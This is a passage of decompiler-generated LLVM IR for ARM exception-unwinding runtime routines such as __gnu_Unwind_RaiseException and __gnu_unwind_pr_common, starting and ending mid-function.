  uselistorder i1 true, { 0, 1, 2, 3, 108, 144, 4, 145, 146, 147, 148, 5, 93, 127, 149, 6, 92, 150, 7, 91, 151, 152, 153, 154, 8, 155, 128, 9, 95, 156, 10, 94, 157, 158, 11, 159, 160, 161, 12, 162, 163, 13, 164, 14, 130, 165, 166, 129, 167, 168, 15, 96, 16, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 18, 98, 19, 179, 180, 181, 20, 97, 182, 21, 17, 183, 184, 22, 185, 186, 187, 23, 188, 189, 190, 191, 192, 24, 25, 131, 26, 27, 28, 143, 99, 193, 194, 100, 195, 133, 196, 197, 30, 198, 199, 31, 101, 201, 29, 202, 200, 203, 132, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 105, 44, 45, 46, 47, 48, 115, 114, 49, 222, 90, 106, 112, 204, 113, 213, 205, 136, 206, 207, 50, 208, 51, 52, 209, 210, 107, 211, 212, 103, 214, 215, 216, 217, 218, 219, 53, 54, 220, 221, 135, 134, 65, 66, 67, 223, 68, 69, 116, 117, 122, 118, 123, 110, 121, 224, 111, 126, 225, 55, 226, 56, 57, 58, 227, 137, 138, 59, 60, 228, 139, 140, 61, 62, 229, 141, 142, 63, 64, 109, 230, 231, 124, 232, 70, 102, 71, 72, 73, 74, 75, 76, 77, 234, 235, 236, 237, 119, 238, 239, 240, 241, 242, 243, 244, 82, 83, 245, 84, 85, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 81, 261, 262, 263, 264, 265, 266, 80, 267, 104, 120, 125, 86, 268, 78, 79, 233, 269, 87, 88, 89 }
  uselistorder i32 %ucbp, { 1, 0, 2, 4, 3 }
  uselistorder label %dec_label_pc_1a350, { 1, 0 }
  uselistorder label %dec_label_pc_1a348, { 1, 0 }
}

define i32 @__gnu_Unwind_RaiseException(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-248 = alloca i32, align 4
  %saved_vrs_-320 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1a35c = load i32, i32* @r4, align 4
  store i32 %v3_1a35c, i32* %stack_var_-16, align 4
  %v6_1a35c = load i32, i32* @r5, align 4
  %v9_1a35c = load i32, i32* @r6, align 4
  %v12_1a35c = load i32, i32* @lr, align 4
  %v1_1a360 = add i32 %entry_vrs, 60
  %v2_1a360 = inttoptr i32 %v1_1a360 to i32*
  %v3_1a360 = load i32, i32* %v2_1a360, align 4
  %v2_1a364 = add i32 %entry_vrs, 64
  %v3_1a364 = inttoptr i32 %v2_1a364 to i32*
  store i32 %v3_1a360, i32* %v3_1a364, align 4
  store i32 %entry_vrs, i32* @r6, align 4
  store i32 %ucbp, i32* @r5, align 4
  %v11_1a394 = load i32, i32* %v3_1a364, align 4
  store i32 -1, i32* %saved_vrs_-320, align 4
  %v2_1a3ac = call i32 @get_eit_entry(i32 %ucbp, i32 %v11_1a394)
  %v2_1a3b0 = icmp eq i32 %v2_1a3ac, 0
  br i1 %v2_1a3b0, label %dec_label_pc_1a3b8, label %dec_label_pc_1a3ec

dec_label_pc_1a3b8:                               ; preds = %entry
  %v0_1a3b8 = load i32, i32* @r5, align 4
  %v1_1a3c0 = add i32 %v0_1a3b8, 16
  %v2_1a3c0 = inttoptr i32 %v1_1a3c0 to i32*
  %v3_1a3c0 = load i32, i32* %v2_1a3c0, align 4
  call void @__pseudo_branch(i32 %v3_1a3c0)
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_1a3d8 = load i32, i32* %saved_vrs_-320, align 4
  %v1_1a3dc = urem i32 %v2_1a3d8, 2
  %v2_1a3dc = icmp eq i32 %v1_1a3dc, 0
  br i1 %v2_1a3dc, label %dec_label_pc_1a3fc, label %dec_label_pc_1a3e4

dec_label_pc_1a3e4:                               ; preds = %dec_label_pc_1a3b8, %dec_label_pc_1a3fc
  %v0_1a3e4 = phi i1 [ false, %dec_label_pc_1a3b8 ], [ %phitmp, %dec_label_pc_1a3fc ]
  br i1 %v0_1a3e4, label %dec_label_pc_1a408, label %dec_label_pc_1a3ec

dec_label_pc_1a3ec:                               ; preds = %entry, %dec_label_pc_1a3e4
  %v2_1a3f4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1a3f4, i32* @r4, align 4
  store i32 %v6_1a35c, i32* @r5, align 4
  store i32 %v9_1a35c, i32* @r6, align 4
  store i32 %v12_1a35c, i32* @lr, align 4
  ret i32 9

dec_label_pc_1a3fc:                               ; preds = %dec_label_pc_1a3b8
  %v2_1a3fc = ptrtoint i32* %stack_var_-248 to i32
  store i32 %v2_1a3fc, i32* @r0, align 4
  %v1_1a400 = call i32 @__gnu_Unwind_Restore_VFP(i32 %v2_1a3fc)
  %v0_1a3e4.pre = load i32, i32* %r4.global-to-local, align 4
  %phitmp = icmp eq i32 %v0_1a3e4.pre, 6
  br label %dec_label_pc_1a3e4

dec_label_pc_1a408:                               ; preds = %dec_label_pc_1a3e4
  %v0_1a408 = load i32, i32* @r5, align 4
  %v0_1a40c = load i32, i32* @r6, align 4
  call void @unwind_phase2(i32 %v0_1a408, i32 %v0_1a40c)
  ret i32 ptrtoint (i32* @0 to i32)

; uselistorder directives
  uselistorder void (i32, i32)* @unwind_phase2, { 1, 0 }
  uselistorder i32 (i32, i32)* @get_eit_entry, { 3, 2, 0, 1 }
  uselistorder i32 %entry_vrs, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1a3ec, { 1, 0 }
  uselistorder label %dec_label_pc_1a3e4, { 1, 0 }
}

define i32 @__gnu_Unwind_Resume_or_Rethrow(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %v1_1a414 = add i32 %ucbp, 12
  %v2_1a414 = inttoptr i32 %v1_1a414 to i32*
  %v3_1a414 = load i32, i32* %v2_1a414, align 4
  %v2_1a418 = icmp eq i32 %v3_1a414, 0
  br i1 %v2_1a418, label %dec_label_pc_1a420, label %dec_label_pc_1a424

dec_label_pc_1a420:                               ; preds = %entry
  %v2_1a420 = call i32 @__gnu_Unwind_RaiseException(i32 0, i32 %entry_vrs)
  br label %dec_label_pc_1a424

dec_label_pc_1a424:                               ; preds = %entry, %dec_label_pc_1a420
  %v1_1a424 = add i32 %entry_vrs, 60
  %v2_1a424 = inttoptr i32 %v1_1a424 to i32*
  %v3_1a424 = load i32, i32* %v2_1a424, align 4
  %v2_1a42c = add i32 %entry_vrs, 64
  %v3_1a42c = inttoptr i32 %v2_1a42c to i32*
  store i32 %v3_1a424, i32* %v3_1a42c, align 4
  %v3_1a430 = call i32 @unwind_phase2_forced(i32 0, i32 %entry_vrs, i32 0)
  ret i32 %v3_1a430

; uselistorder directives
  uselistorder i32 (i32, i32, i32)* @unwind_phase2_forced, { 2, 0, 1 }
  uselistorder i32 %entry_vrs, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_1a424, { 1, 0 }
}

define i32 @_Unwind_VRS_Pop(i32 %context, i32 %regclass, i32 %discriminator, i32 %representation) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %regclass, 5
  br i1 %tmp, label %bb, label %dec_label_pc_1a490

bb:                                               ; preds = %entry
  %v7_1a448 = mul i32 %regclass, 4
  %v8_1a448 = add i32 %v7_1a448, ptrtoint (i32* @global_var_1a450.1109 to i32)
  call void @__pseudo_branch(i32 %v8_1a448)
  br label %dec_label_pc_1a490

dec_label_pc_1a490:                               ; preds = %bb, %entry
  ret i32 2

; uselistorder directives
  uselistorder i32 %regclass, { 1, 0 }
}

define i32 @__gnu_unwind_pr_common(i32 %state, i32 %ucbp, i32 %context, i32 %id) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %context, i32* %r2.global-to-local, align 4
  store i32 %state, i32* %r0.global-to-local, align 4
  %forced_unwind_-44 = alloca i32, align 4
  %uws_-60 = alloca %anon_struct_4, align 8
  %stack_var_-48 = alloca i32, align 4
  %v3_1a578 = load i32, i32* @r4, align 4
  %v6_1a578 = load i32, i32* @r5, align 4
  %v2_1a588 = icmp eq i32 %id, 0
  store i32 %ucbp, i32* @r8, align 4
  %v1_1a590 = add i32 %ucbp, 76
  %v2_1a590 = inttoptr i32 %v1_1a590 to i32*
  %v3_1a590 = load i32, i32* %v2_1a590, align 4
  %v1_1a59c = inttoptr i32 %v3_1a590 to i32*
  %v2_1a59c = load i32, i32* %v1_1a59c, align 4
  store i32 %v2_1a59c, i32* @lr, align 4
  %v4_1a59c = add i32 %v3_1a590, 4
  store i32 %context, i32* %fp.global-to-local, align 4
  %v1_1a5a8 = urem i32 %state, 4
  store i32 %v1_1a5a8, i32* %r2.global-to-local, align 4
  %v1_1a5ac = and i32 %state, 8
  store i32 %v1_1a5ac, i32* %r0.global-to-local, align 4
  %v4_1a5bc = getelementptr inbounds %anon_struct_4, %anon_struct_4* %uws_-60, i32 0, i32 0
  store i32 %v2_1a59c, i32* %v4_1a5bc, align 8
  br i1 %v2_1a588, label %dec_label_pc_1a5cc, label %dec_label_pc_1a8a8

dec_label_pc_1a5cc:                               ; preds = %entry
  %v3_1a5cc = mul i32 %v2_1a59c, 256
  store i32 %v3_1a5cc, i32* %v4_1a5bc, align 8
  store i32 3, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1a5e4

dec_label_pc_1a5e4:                               ; preds = %dec_label_pc_1a8a8, %dec_label_pc_1a5cc
  %v0_1a608647090 = phi i32 [ %v2_1a8c0, %dec_label_pc_1a8a8 ], [ %v4_1a59c, %dec_label_pc_1a5cc ]
  store i32 %v1_1a5a8, i32* %r2.global-to-local, align 4
  %v1_1a5e8 = add i32 %ucbp, 80
  %v2_1a5e8 = inttoptr i32 %v1_1a5e8 to i32*
  %v3_1a5e8 = load i32, i32* %v2_1a5e8, align 4
  %v7_1a5ec = icmp eq i32 %v1_1a5a8, 2
  br i1 %v7_1a5ec, label %bb, label %bb148

bb:                                               ; preds = %dec_label_pc_1a5e4
  %v2_1a5f0 = add i32 %ucbp, 56
  %v3_1a5f0 = inttoptr i32 %v2_1a5f0 to i32*
  %v4_1a5f0 = load i32, i32* %v3_1a5f0, align 4
  br label %bb148

bb148:                                            ; preds = %dec_label_pc_1a5e4, %bb
  %v0_1a6086470 = phi i32 [ %v0_1a608647090, %dec_label_pc_1a5e4 ], [ %v4_1a5f0, %bb ]
  %v1_1a5f4 = urem i32 %v3_1a5e8, 2
  %v2_1a5f4 = icmp eq i32 %v1_1a5f4, 0
  br i1 %v2_1a5f4, label %dec_label_pc_1a608.preheader, label %bb149

bb149:                                            ; preds = %bb148
  br label %dec_label_pc_1a6c8

dec_label_pc_1a608.preheader:                     ; preds = %bb148
  %v1_1a6086571 = inttoptr i32 %v0_1a6086470 to i32*
  %v2_1a6086672 = load i32, i32* %v1_1a6086571, align 4
  %v2_1a60c6874 = icmp eq i32 %v2_1a6086672, 0
  br i1 %v2_1a60c6874, label %dec_label_pc_1a6c8, label %dec_label_pc_1a614.preheader.lr.ph.lr.ph

dec_label_pc_1a614.preheader.lr.ph.lr.ph:         ; preds = %dec_label_pc_1a608.preheader
  %v7_1a618 = icmp eq i32 %id, 2
  %v2_1a6a4 = icmp eq i32 %v1_1a5a8, 0
  %v2_1a870 = ptrtoint i32* %forced_unwind_-44 to i32
  %v3_1a78c = icmp eq i32 %v1_1a5ac, 0
  br label %dec_label_pc_1a614.preheader.lr.ph

dec_label_pc_1a614.preheader.lr.ph:               ; preds = %dec_label_pc_1a614.preheader.lr.ph.lr.ph, %dec_label_pc_1a8dc
  %v1_1a62496 = phi i32 [ %v2_1a6086672, %dec_label_pc_1a614.preheader.lr.ph.lr.ph ], [ %v2_1a60866, %dec_label_pc_1a8dc ]
  %v1_1a62093 = phi i32 [ %v0_1a6086470, %dec_label_pc_1a614.preheader.lr.ph.lr.ph ], [ %v2_1a8e0, %dec_label_pc_1a8dc ]
  %stack_var_-76.2.ph3175 = phi i32 [ 0, %dec_label_pc_1a614.preheader.lr.ph.lr.ph ], [ %stack_var_-76.4, %dec_label_pc_1a8dc ]
  br label %dec_label_pc_1a614.preheader

dec_label_pc_1a614.preheader:                     ; preds = %dec_label_pc_1a614.preheader.lr.ph, %dec_label_pc_1a8a0
  %v1_1a62495 = phi i32 [ %v1_1a62496, %dec_label_pc_1a614.preheader.lr.ph ], [ %v2_1a608, %dec_label_pc_1a8a0 ]
  %v1_1a62092 = phi i32 [ %v1_1a62093, %dec_label_pc_1a614.preheader.lr.ph ], [ %v1_1a8a0, %dec_label_pc_1a8a0 ]
  br label %dec_label_pc_1a614

dec_label_pc_1a614:                               ; preds = %dec_label_pc_1a614.preheader, %dec_label_pc_1a6b8
  %v1_1a624 = phi i32 [ %v1_1a62495, %dec_label_pc_1a614.preheader ], [ %v2_1a6bc, %dec_label_pc_1a6b8 ]
  %v1_1a638 = phi i32 [ %v1_1a62092, %dec_label_pc_1a614.preheader ], [ %v1_1a6b8, %dec_label_pc_1a6b8 ]
  store i32 %id, i32* %r2.global-to-local, align 4
  br i1 %v7_1a618, label %bb151, label %.thread16

bb151:                                            ; preds = %dec_label_pc_1a614
  %v2_1a61c = add i32 %v1_1a638, 4
  %v3_1a61c = inttoptr i32 %v2_1a61c to i32*
  %v4_1a61c = load i32, i32* %v3_1a61c, align 4
  store i32 %v4_1a61c, i32* @r5, align 4
  store i32 %v1_1a624, i32* @r6, align 4
  %v0_1a628109 = load i32, i32* @r8, align 4
  %v1_1a628110 = add i32 %v0_1a628109, 72
  %v2_1a628111 = inttoptr i32 %v1_1a628110 to i32*
  %v3_1a628112 = load i32, i32* %v2_1a628111, align 4
  store i32 %v3_1a628112, i32* @lr, align 4
  %v2_1a634 = add i32 %v1_1a638, 8
  br label %bb152

.thread16:                                        ; preds = %dec_label_pc_1a614
  %v2_1a620 = add i32 %v1_1a638, 2
  %v3_1a620 = inttoptr i32 %v2_1a620 to i16*
  %v4_1a620 = load i16, i16* %v3_1a620, align 2
  %v5_1a620 = zext i16 %v4_1a620 to i32
  store i32 %v5_1a620, i32* @r5, align 4
  %v0_1a628 = load i32, i32* @r8, align 4
  %v1_1a628 = add i32 %v0_1a628, 72
  %v2_1a628 = inttoptr i32 %v1_1a628 to i32*
  %v3_1a628 = load i32, i32* %v2_1a628, align 4
  store i32 %v3_1a628, i32* @lr, align 4
  %v2_1a630 = inttoptr i32 %v1_1a638 to i16*
  %v3_1a630 = load i16, i16* %v2_1a630, align 2
  %v4_1a630 = zext i16 %v3_1a630 to i32
  store i32 %v4_1a630, i32* @r6, align 4
  %v2_1a638 = add i32 %v1_1a638, 4
  br label %bb152

bb152:                                            ; preds = %bb151, %.thread16
  %storemerge121 = phi i32 [ %v2_1a638, %.thread16 ], [ %v2_1a634, %bb151 ]
  %v3_1a628115 = phi i32 [ %v3_1a628, %.thread16 ], [ %v3_1a628112, %bb151 ]
  %v0_1a640113 = phi i32 [ %v5_1a620, %.thread16 ], [ %v4_1a61c, %bb151 ]
  store i32 %storemerge121, i32* @r7, align 4
  %v1_1a640 = and i32 %v0_1a640113, -2
  %v2_1a644 = add i32 %v1_1a640, %v3_1a628115
  store i32 %v2_1a644, i32* @r4, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_1a654 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_1a654, i32* %r0.global-to-local, align 4
  %v5_1a660 = call i32 @_Unwind_VRS_Get(i32 %v0_1a654, i32 15, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_1a660, i32* %r0.global-to-local, align 4
  %v3_1a664 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_1a664, i32* %r2.global-to-local, align 4
  %v0_1a668 = load i32, i32* @r4, align 4
  %tmp = icmp ugt i32 %v0_1a668, %v3_1a664
  br i1 %tmp, label %._crit_edge, label %dec_label_pc_1a674

._crit_edge:                                      ; preds = %bb152
  %v0_1a68c.pre = load i32, i32* @r6, align 4
  br label %bb154

dec_label_pc_1a674:                               ; preds = %bb152
  %v0_1a674 = load i32, i32* @r6, align 4
  %v1_1a674 = and i32 %v0_1a674, -2
  %v2_1a678 = add i32 %v1_1a674, %v0_1a668
  %v3_1a67c = icmp ult i32 %v3_1a664, %v2_1a678
  br i1 %v3_1a67c, label %.thread20, label %bb153

bb153:                                            ; preds = %dec_label_pc_1a674
  br label %bb154

.thread20:                                        ; preds = %dec_label_pc_1a674
  br label %bb154

bb154:                                            ; preds = %bb153, %._crit_edge, %.thread20
  %v0_1a68c = phi i32 [ %v0_1a68c.pre, %._crit_edge ], [ %v0_1a674, %bb153 ], [ %v0_1a674, %.thread20 ]
  %v0_1a834 = phi i32 [ 0, %._crit_edge ], [ 0, %bb153 ], [ 1, %.thread20 ]
  %v0_1a688 = load i32, i32* @r5, align 4
  %v1_1a68c = urem i32 %v0_1a68c, 2
  %v1_1a688 = mul i32 %v0_1a688, 2
  %v3_1a690 = and i32 %v1_1a688, 2
  %v4_1a690 = or i32 %v3_1a690, %v1_1a68c
  store i32 %v4_1a690, i32* %r2.global-to-local, align 4
  %v7_1a694 = icmp eq i32 %v4_1a690, 1
  br i1 %v7_1a694, label %dec_label_pc_1a828, label %dec_label_pc_1a69c

dec_label_pc_1a69c:                               ; preds = %bb154
  %v2_1a694 = icmp eq i32 %v4_1a690, 0
  br i1 %v2_1a694, label %dec_label_pc_1a6a0, label %dec_label_pc_1a750

dec_label_pc_1a6a0:                               ; preds = %dec_label_pc_1a69c
  store i32 %v1_1a5a8, i32* %r2.global-to-local, align 4
  br i1 %v2_1a6a4, label %.thread, label %bb155

.thread:                                          ; preds = %dec_label_pc_1a6a0
  %v0_1a6b8119 = load i32, i32* @r7, align 4
  br label %dec_label_pc_1a6b8

bb155:                                            ; preds = %dec_label_pc_1a6a0
  %v2_1a6b0 = icmp eq i32 %v0_1a834, 0
  %v0_1a6b8 = load i32, i32* @r7, align 4
  br i1 %v2_1a6b0, label %dec_label_pc_1a6b8, label %dec_label_pc_1aa30

dec_label_pc_1a6b8:                               ; preds = %.thread, %bb155
  %v0_1a6b8120 = phi i32 [ %v0_1a6b8119, %.thread ], [ %v0_1a6b8, %bb155 ]
  %v1_1a6b8 = add i32 %v0_1a6b8120, 4
  %v1_1a6bc = inttoptr i32 %v1_1a6b8 to i32*
  %v2_1a6bc = load i32, i32* %v1_1a6bc, align 4
  %v2_1a6c0 = icmp eq i32 %v2_1a6bc, 0
  br i1 %v2_1a6c0, label %dec_label_pc_1a6c8, label %dec_label_pc_1a614

dec_label_pc_1a6c8:                               ; preds = %dec_label_pc_1a8dc, %dec_label_pc_1a8a0, %dec_label_pc_1a6b8, %dec_label_pc_1a608.preheader, %bb149
  %stack_var_-76.3 = phi i32 [ 0, %bb149 ], [ 0, %dec_label_pc_1a608.preheader ], [ %stack_var_-76.2.ph3175, %dec_label_pc_1a6b8 ], [ %stack_var_-76.2.ph3175, %dec_label_pc_1a8a0 ], [ %stack_var_-76.4, %dec_label_pc_1a8dc ]
  %v0_1a6c8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_1a6c8, i32* %r0.global-to-local, align 4
  %tmp156 = bitcast %anon_struct_4* %uws_-60 to %anon_struct_13*
  %v4_1a6d0 = call i32 @__gnu_unwind_execute(i32 %v0_1a6c8, %anon_struct_13* %tmp156)
  store i32 %v4_1a6d0, i32* %r0.global-to-local, align 4
  store i32 %v4_1a6d0, i32* %r5.global-to-local, align 4
  %v2_1a6d4 = icmp eq i32 %v4_1a6d0, 0
  br i1 %v2_1a6d4, label %dec_label_pc_1a6dc, label %dec_label_pc_1a758

dec_label_pc_1a6dc:                               ; preds = %dec_label_pc_1a6c8
  store i32 %stack_var_-76.3, i32* %r2.global-to-local, align 4
  %v2_1a6e0 = icmp eq i32 %stack_var_-76.3, 0
  br i1 %v2_1a6e0, label %bb157, label %dec_label_pc_1a6ec

bb157:                                            ; preds = %dec_label_pc_1a6dc
  store i32 8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a75c

dec_label_pc_1a6ec:                               ; preds = %dec_label_pc_1a6dc
  %v2_1a6ec = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_1a6ec, i32* %r4.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_1a6fc = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_1a6fc, i32* %r0.global-to-local, align 4
  %tmp158 = bitcast i32* %stack_var_-48 to i8*
  %v7_1a704 = call i32 @_Unwind_VRS_Get(i32 %v0_1a6fc, i32 0, i32 15, i32 0, i8* %tmp158)
  %v0_1a708 = load i32, i32* %r5.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 %v0_1a6fc, i32* %r0.global-to-local, align 4
  %v5_1a71c = call i32 @_Unwind_VRS_Set(i32 %v0_1a6fc, i32 %v0_1a708, i32 14, i32 %v0_1a708, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_1a71c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* %r2.global-to-local, align 4
  %v4_1a728 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 32) to i32*), align 4
  %v0_1a72c = load i32, i32* %r5.global-to-local, align 4
  %v0_1a730 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_1a730, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 %v4_1a728, i32* %stack_var_-48, align 4
  %v5_1a744 = call i32 @_Unwind_VRS_Set(i32 %v0_1a730, i32 %v0_1a72c, i32 15, i32 %v0_1a72c, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a75c

dec_label_pc_1a750:                               ; preds = %dec_label_pc_1a69c
  %v7_1a750 = icmp eq i32 %v4_1a690, 2
  br i1 %v7_1a750, label %dec_label_pc_1a768, label %dec_label_pc_1a758

dec_label_pc_1a758:                               ; preds = %dec_label_pc_1a750, %dec_label_pc_1a83c, %dec_label_pc_1a6c8, %dec_label_pc_1aa30
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a75c

dec_label_pc_1a75c:                               ; preds = %bb157, %dec_label_pc_1aa68, %dec_label_pc_1a9f8, %bb166, %dec_label_pc_1a6ec, %dec_label_pc_1a758
  %v1_1a764 = phi i32 [ 8, %bb157 ], [ 7, %dec_label_pc_1aa68 ], [ %v1_1a764.pre, %dec_label_pc_1a9f8 ], [ 7, %bb166 ], [ 7, %dec_label_pc_1a6ec ], [ 9, %dec_label_pc_1a758 ]
  store i32 %v3_1a578, i32* %r4.global-to-local, align 4
  store i32 %v6_1a578, i32* %r5.global-to-local, align 4
  ret i32 %v1_1a764

dec_label_pc_1a768:                               ; preds = %dec_label_pc_1a750
  store i32 %v1_1a5a8, i32* %r2.global-to-local, align 4
  %v0_1a76c = load i32, i32* @r7, align 4
  %v1_1a76c = inttoptr i32 %v0_1a76c to i32*
  %v2_1a76c = load i32, i32* %v1_1a76c, align 4
  %tmp206 = bitcast i32 %v2_1a76c to float
  %tmp207 = call float @fabsf(float %tmp206)
  %v1_1a774 = bitcast float %tmp207 to i32
  store i32 %v1_1a774, i32* @sl, align 4
  br i1 %v2_1a6a4, label %dec_label_pc_1a77c, label %dec_label_pc_1a8e8

dec_label_pc_1a77c:                               ; preds = %dec_label_pc_1a768
  %v2_1a77c = icmp eq i32 %v0_1a834, 0
  br i1 %v2_1a77c, label %dec_label_pc_1a8d0, label %dec_label_pc_1a784

dec_label_pc_1a784:                               ; preds = %dec_label_pc_1a77c
  %v2_1a788 = icmp eq i32 %v1_1a774, 0
  br i1 %v2_1a788, label %dec_label_pc_1a794.thread, label %bb159

dec_label_pc_1a794.thread:                        ; preds = %dec_label_pc_1a784
  br label %dec_label_pc_1a9f8

bb159:                                            ; preds = %dec_label_pc_1a784
  br i1 %v3_1a78c, label %dec_label_pc_1a79c, label %dec_label_pc_1a8d0

dec_label_pc_1a79c:                               ; preds = %bb159
  %v1_1a79c = add i32 %v0_1a76c, 4
  store i32 %v1_1a79c, i32* @r6, align 4
  store i32 100, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v0_1a7ac = load i32, i32* @r8, align 4
  %v1_1a7ac = add i32 %v0_1a7ac, 88
  store i32 %v1_1a7ac, i32* %sb.global-to-local, align 4
  store i32 %v1_1a79c, i32* @r4, align 4
  br label %dec_label_pc_1a7d0

dec_label_pc_1a7c0:                               ; preds = %bb161
  %v1_1a7c0 = add i32 %v0_1a7c0, 1
  store i32 %v1_1a7c0, i32* @r5, align 4
  %v1_1a7c4 = load i32, i32* @sl, align 4
  %v9_1a7c4 = icmp eq i32 %v1_1a7c0, %v1_1a7c4
  %v0_1a7c8 = load i32, i32* @r4, align 4
  %v1_1a7c8 = add i32 %v0_1a7c8, 4
  store i32 %v1_1a7c8, i32* @r4, align 4
  br i1 %v9_1a7c4, label %dec_label_pc_1a9f8, label %dec_label_pc_1a7c0.dec_label_pc_1a7d0_crit_edge

dec_label_pc_1a7c0.dec_label_pc_1a7d0_crit_edge:  ; preds = %dec_label_pc_1a7c0
  %v0_1a7dc.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_1a7d0

dec_label_pc_1a7d0:                               ; preds = %dec_label_pc_1a7c0.dec_label_pc_1a7d0_crit_edge, %dec_label_pc_1a79c
  %v0_1a7dc = phi i32 [ %v0_1a7dc.pre, %dec_label_pc_1a7c0.dec_label_pc_1a7d0_crit_edge ], [ %v1_1a7ac, %dec_label_pc_1a79c ]
  %v1_1a7e0 = phi i32 [ %v1_1a7c8, %dec_label_pc_1a7c0.dec_label_pc_1a7d0_crit_edge ], [ %v1_1a79c, %dec_label_pc_1a79c ]
  %v1_1a7d0 = inttoptr i32 %v1_1a7e0 to i32*
  %v2_1a7d0 = load i32, i32* %v1_1a7d0, align 4
  %v2_1a7d4 = icmp eq i32 %v2_1a7d0, 0
  store i32 %v0_1a7dc, i32* %forced_unwind_-44, align 4
  br i1 %v2_1a7d4, label %bb161, label %bb160

bb160:                                            ; preds = %dec_label_pc_1a7d0
  br label %bb161

bb161:                                            ; preds = %dec_label_pc_1a7d0, %bb160
  %v0_1a7e4 = load i32, i32* @r8, align 4
  store i32 %v0_1a7e4, i32* %r0.global-to-local, align 4
  store i32 %v2_1a870, i32* %r2.global-to-local, align 4
  %v4_1a7f4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 100) to i32*), align 4
  store i32 108544, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1a7f4)
  %v0_1a800 = load i32, i32* %r0.global-to-local, align 4
  %v2_1a800 = icmp eq i32 %v0_1a800, 0
  %v0_1a7c0 = load i32, i32* @r5, align 4
  br i1 %v2_1a800, label %dec_label_pc_1a7c0, label %dec_label_pc_1a808

dec_label_pc_1a808:                               ; preds = %bb161
  %v1_1a808 = load i32, i32* @sl, align 4
  %v9_1a808 = icmp eq i32 %v0_1a7c0, %v1_1a808
  br i1 %v9_1a808, label %dec_label_pc_1a9f8, label %dec_label_pc_1a810

dec_label_pc_1a810:                               ; preds = %dec_label_pc_1a808
  %v0_1a810 = load i32, i32* @r7, align 4
  %v1_1a810 = inttoptr i32 %v0_1a810 to i32*
  %v2_1a810 = load i32, i32* %v1_1a810, align 4
  %v1_1a814 = icmp slt i32 %v2_1a810, 0
  %v0_1a81c.pre = load i32, i32* @r6, align 4
  br i1 %v1_1a814, label %dec_label_pc_1a81c, label %dec_label_pc_1a8dc

dec_label_pc_1a81c:                               ; preds = %dec_label_pc_1a810, %dec_label_pc_1a8d4
  %v0_1a81c = phi i32 [ %storemerge, %dec_label_pc_1a8d4 ], [ %v0_1a81c.pre, %dec_label_pc_1a810 ]
  store i32 %v0_1a81c, i32* %r0.global-to-local, align 4
  %v1_1a820 = add i32 %v0_1a81c, 4
  store i32 %v1_1a820, i32* @r6, align 4
  br label %dec_label_pc_1a8dc

dec_label_pc_1a828:                               ; preds = %bb154
  store i32 %v1_1a5a8, i32* %r2.global-to-local, align 4
  br i1 %v2_1a6a4, label %dec_label_pc_1a834, label %dec_label_pc_1a920

dec_label_pc_1a834:                               ; preds = %dec_label_pc_1a828
  %v2_1a834 = icmp eq i32 %v0_1a834, 0
  br i1 %v2_1a834, label %dec_label_pc_1a8a0, label %dec_label_pc_1a83c

dec_label_pc_1a83c:                               ; preds = %dec_label_pc_1a834
  %v0_1a83c = load i32, i32* @r7, align 4
  %v1_1a83c = add i32 %v0_1a83c, 4
  %v2_1a83c = inttoptr i32 %v1_1a83c to i32*
  %v3_1a83c = load i32, i32* %v2_1a83c, align 4
  %v7_1a840 = icmp eq i32 %v3_1a83c, -2
  store i32 %v1_1a83c, i32* %r2.global-to-local, align 4
  br i1 %v7_1a840, label %dec_label_pc_1a758, label %dec_label_pc_1a84c

dec_label_pc_1a84c:                               ; preds = %dec_label_pc_1a83c
  %v0_1a84c = load i32, i32* @r8, align 4
  %v1_1a84c = add i32 %v0_1a84c, 88
  %v7_1a850 = icmp eq i32 %v3_1a83c, -1
  store i32 %v1_1a84c, i32* %forced_unwind_-44, align 4
  br i1 %v7_1a850, label %dec_label_pc_1a894, label %dec_label_pc_1a85c

dec_label_pc_1a85c:                               ; preds = %dec_label_pc_1a84c
  %v2_1a860 = icmp eq i32 %v3_1a83c, 0
  br i1 %v2_1a860, label %bb163, label %bb162

bb162:                                            ; preds = %dec_label_pc_1a85c
  br label %bb163

